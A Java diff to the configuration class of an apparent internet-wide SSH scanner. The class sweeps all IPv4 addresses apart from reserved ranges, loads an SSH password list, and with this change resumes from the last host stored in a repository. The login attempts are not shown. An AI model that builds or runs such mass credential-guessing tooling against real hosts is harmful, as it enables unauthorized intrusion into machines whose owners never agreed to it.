@@ -4,6 +4,8 @@ import com.github.jgonian.ipmath.Ipv4;
 import com.github.jgonian.ipmath.Ipv4Range;
 import com.google.gson.Gson;
 import com.google.gson.stream.JsonReader;
+import don.savagescan.entity.CurrentServer;
+import don.savagescan.repositories.CurrentServerRepository;
 import don.savagescan.repositories.ServerRepository;
 import don.savagescan.utils.IpRange;
 import lombok.Data;
@@ -26,19 +28,21 @@ import java.util.concurrent.LinkedBlockingQueue;
 @Component
 @Data
 public class ScanConfig {
-    private final BlockingQueue<String> queue = new LinkedBlockingQueue<>(1_000_000);
+    private final BlockingQueue<String> queue = new LinkedBlockingQueue<>(100_000);
     private final List<Ipv4Range> ipv4ReservedIps = new ArrayList<>();
     private final List<String> sshPasswords = new ArrayList<>();
     private final ServerRepository serverRepository;
+    private final CurrentServerRepository currentServerRepository;
     private Ipv4 start = Ipv4.FIRST_IPV4_ADDRESS;
-    private Ipv4 current = start;
+    private long current = start.asBigInteger().longValue();
     @Value("classpath:sshPasswords.txt")
     private Resource sshPasswordsFile;
     @Value("classpath:reservedIps.json")
     private Resource reservedIpsFile;
 
-    public ScanConfig(ServerRepository serverRepository) {
+    public ScanConfig(ServerRepository serverRepository, CurrentServerRepository currentServerRepository) {
         this.serverRepository = serverRepository;
+        this.currentServerRepository = currentServerRepository;
     }
 
     @PostConstruct
@@ -51,5 +55,13 @@ public class ScanConfig {
 
         Arrays.stream(reservedIps).forEach(range ->
                 ipv4ReservedIps.add(Ipv4Range.from(range.getStart()).to(range.getEnd())));
+
+        CurrentServer currentServer = currentServerRepository.findFirstByOrderByIdDesc();
+
+        if (currentServer == null) {
+            currentServer = currentServerRepository.save(new CurrentServer(start.toString()));
+        }
+
+        start = Ipv4.of(currentServer.getHost());
     }
 }
